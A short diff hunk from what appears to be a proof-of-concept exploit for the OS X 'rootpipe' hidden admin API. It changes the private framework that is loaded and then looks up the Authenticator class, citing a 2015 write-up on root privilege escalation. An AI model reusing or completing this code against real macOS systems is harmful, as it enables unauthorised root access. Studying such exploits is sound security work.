@@ -27,7 +27,7 @@ int main(int argc, const char *argv[])
 	
 	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
 	
-	dlopen("/System/Library/PrivateFrameworks/SystemAdministration.framework/Versions/A/SystemAdministration", RTLD_LAZY | RTLD_GLOBAL);
+	dlopen("/System/Library/PrivateFrameworks/Admin.framework/Versions/A/Admin", RTLD_LAZY | RTLD_GLOBAL);
 	
 	id authent = [objc_lookUpClass("Authenticator") sharedAuthenticator];
 	
